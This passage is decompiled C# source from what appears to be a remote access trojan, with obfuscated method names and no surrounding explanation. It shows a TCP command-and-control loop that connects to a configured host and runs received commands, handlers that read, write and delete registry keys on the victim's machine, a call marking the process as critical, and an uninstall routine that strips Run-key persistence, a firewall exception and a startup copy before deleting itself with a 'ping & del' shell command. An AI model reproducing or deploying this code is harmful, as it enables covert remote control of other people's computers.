						string[] subKeyNames = registryKey.GetSubKeyNames();
						foreach (string text3 in subKeyNames)
						{
							if (!text3.Contains("\\"))
							{
								text2 = text2 + text3 + string_7;
							}
						}
						string[] valueNames = registryKey.GetValueNames();
						foreach (string text4 in valueNames)
						{
							text2 = text2 + text4 + "/" + registryKey.GetValueKind(text4).ToString() + "/" + registryKey.GetValue(text4, "")!.ToString() + string_7;
						}
						smethod_26(text + text2);
						break;
					}
					case "!":
						registryKey.SetValue(array[3], array[4], unchecked((RegistryValueKind)Conversions.ToInteger(array[5])));
						break;
					case "@":
						registryKey.DeleteValue(array[3], throwOnMissingValue: false);
						break;
					case "#":
						registryKey.CreateSubKey(array[3]);
						break;
					case "$":
						registryKey.DeleteSubKeyTree(array[3]);
						break;
					}
					break;
				}
				}
			}
			catch (Exception ex7)
			{
				ProjectData.SetProjectError(ex7);
				Exception ex8 = ex7;
				try
				{
					smethod_26("ER" + string_7 + array[0] + string_7 + ex8.Message);
				}
				catch (Exception projectError16)
				{
					ProjectData.SetProjectError(projectError16);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string smethod_22(byte[] byte_1)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte_1 = mD5CryptoServiceProvider.ComputeHash(byte_1);
		string text = "";
		byte[] array = byte_1;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text;
	}

	public static RegistryKey smethod_23(string string_11)
	{
		if (string_11.StartsWith(((ServerComputer)computer_0).get_Registry().get_ClassesRoot().Name))
		{
			string name = string_11.Replace(((ServerComputer)computer_0).get_Registry().get_ClassesRoot().Name + "\\", "");
			return ((ServerComputer)computer_0).get_Registry().get_ClassesRoot().OpenSubKey(name, writable: true);
		}
		if (string_11.StartsWith(((ServerComputer)computer_0).get_Registry().get_CurrentUser().Name))
		{
			string name = string_11.Replace(((ServerComputer)computer_0).get_Registry().get_CurrentUser().Name + "\\", "");
			return ((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey(name, writable: true);
		}
		if (string_11.StartsWith(((ServerComputer)computer_0).get_Registry().get_LocalMachine().Name))
		{
			string name = string_11.Replace(((ServerComputer)computer_0).get_Registry().get_LocalMachine().Name + "\\", "");
			return ((ServerComputer)computer_0).get_Registry().get_LocalMachine().OpenSubKey(name, writable: true);
		}
		if (string_11.StartsWith(((ServerComputer)computer_0).get_Registry().get_Users().Name))
		{
			string name = string_11.Replace(((ServerComputer)computer_0).get_Registry().get_Users().Name + "\\", "");
			return ((ServerComputer)computer_0).get_Registry().get_Users().OpenSubKey(name, writable: true);
		}
		return null;
	}

	public static void smethod_24(int int_0)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_0, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool smethod_25(byte[] byte_1)
	{
		if (!bool_4)
		{
			return false;
		}
		lock (fileInfo_0)
		{
			if (bool_4)
			{
				try
				{
					MemoryStream memoryStream = new MemoryStream();
					memoryStream.Write(byte_1, 0, byte_1.Length);
					memoryStream.Write(smethod_8(ref string_8), 0, string_8.Length);
					tcpClient_0.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
					memoryStream.Dispose();
					return true;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					try
					{
						if (bool_4)
						{
							tcpClient_0.Close();
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					bool_4 = false;
					bool result = false;
					ProjectData.ClearProjectError();
					return result;
				}
			}
			return false;
		}
	}

	public static bool smethod_26(string string_11)
	{
		return smethod_25(smethod_8(ref string_11));
	}

	public static bool smethod_27()
	{
		lock (fileInfo_0)
		{
			try
			{
				if (tcpClient_0 != null)
				{
					try
					{
						tcpClient_0.Client.Disconnect(reuseSocket: false);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					try
					{
						tcpClient_0.Close();
						tcpClient_0 = null;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					memoryStream_0.Dispose();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				memoryStream_0 = new MemoryStream();
				try
				{
					if (process_0 != null)
					{
						process_0.Kill();
						process_0 = null;
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_0 = new TcpClient();
				Thread.Sleep(1000);
				tcpClient_0.Connect(string_5, Conversions.ToInteger(string_6));
				bool_4 = true;
				smethod_26(smethod_3());
				if (!bool_4)
				{
					return false;
				}
				return true;
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				bool_4 = false;
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static void smethod_28()
	{
		checked
		{
			while (true)
			{
				if (tcpClient_0 != null)
				{
					try
					{
						while (bool_4)
						{
							if (tcpClient_0.Available != 0)
							{
								byte_0 = new byte[tcpClient_0.Client.Available - 1 + 1];
								int num = tcpClient_0.Client.Receive(byte_0, 0, byte_0.Length, SocketFlags.None);
								if (num <= 0)
								{
									break;
								}
								memoryStream_0.Write(byte_0, 0, num);
								while (true)
								{
									byte[] byte_ = memoryStream_0.ToArray();
									if (!smethod_9(ref byte_).Contains(string_8))
									{
										break;
									}
									Array array = smethod_10(memoryStream_0.ToArray(), string_8);
									Thread thread = new Thread(delegate(object object_0)
									{
										smethod_21((byte[])object_0);
									});
									thread.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null)));
									thread.Join(200);
									memoryStream_0.Dispose();
									memoryStream_0 = new MemoryStream();
									if (array.Length != 2)
									{
										break;
									}
									memoryStream_0.Write((byte[])NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null)));
								}
							}
							else
							{
								int num2 = tcpClient_0.GetStream().ReadByte();
								if (num2 == -1)
								{
									break;
								}
								memoryStream_0.WriteByte((byte)num2);
							}
							Thread.Sleep(1);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				do
				{
					bool_4 = false;
					Thread.Sleep(2500);
				}
				while (!smethod_27());
				bool_4 = true;
			}
		}
	}

	public static void smethod_29()
	{
		smethod_24(0);
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey(string_9, writable: true)!.DeleteValue(string_4, throwOnMissingValue: false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)computer_0).get_Registry().get_LocalMachine().OpenSubKey(string_9, writable: true)!.DeleteValue(string_4, throwOnMissingValue: false);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("netsh firewall delete allowedprogram \"" + fileInfo_0.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (fileStream_0 != null)
			{
				fileStream_0.Dispose();
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_4 + ".exe");
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey("Software", writable: true)!.DeleteSubKey(string_4, throwOnMissingSubKey: false);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("cmd.exe /c ping 127.0.0.1 & del \"" + fileInfo_0.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	[SpecialName]
	private static void _Lambda_0024__1(object object_0)
	{
		smethod_26(Conversions.ToString(object_0));
	}

	[SpecialName]
	private static void _Lambda_0024__2(object sender, EventArgs e)
	{
		smethod_20();
	}

	[SpecialName]
	private static void _Lambda_0024__3(object object_0)
	{
		smethod_21((byte[])object_0);
	}
}
